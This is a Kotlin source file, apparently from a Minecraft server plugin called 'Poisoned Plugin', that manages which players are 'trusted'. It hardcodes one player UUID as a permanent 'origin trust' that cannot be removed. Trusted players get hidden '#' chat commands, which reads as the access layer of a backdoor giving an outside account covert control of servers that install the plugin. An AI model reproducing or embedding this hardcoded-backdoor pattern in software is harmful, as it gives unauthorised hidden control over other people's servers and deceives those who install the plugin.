package de.maxbossing.poisonedplugin.manager

import de.maxbossing.poisonedplugin.utils.log
import org.bukkit.entity.Player
import java.util.*

/**
 * Trust Manager
 *
 * Trust is a core principle of the Poisoned Plugin, as untrusted Players cannot do anything
 */
object TrustedUserManager {

    /**
     * Origin Trusts, cannot be untrusted
     */
    val originTrusts = listOf(
        UUID.fromString("11e6f3a0-d838-4f93-a046-e16e5cd0dbd8")
    )

    /**
     * Trusted Users
     */
    val trustedUsers: MutableList<UUID> = originTrusts.toMutableList()


    /**
     * Get/Set the Player trust
     */
    var Player.trusted: Boolean
        get() = trustedUsers.contains(this.uniqueId)
        set(value) {
            if (!value) {
                trustedUsers.remove(this.uniqueId)
                removeCustomChatCompletions(ChatCommandManager.commands.keys.map { "#$it" })
                log("${this.name} untrusted")
            } else {
                trustedUsers.add(this.uniqueId)
                addCustomChatCompletions(ChatCommandManager.commands.keys.map { "#$it" })
                log("${this.name} trusted")
            }
        }

    /**
     * Trust a Player
     */
    fun Player.trust() {
        trusted = true
    }

    /**
     * Untrust a Player
     */
    fun Player.untrust() {
        trusted = false
    }
}
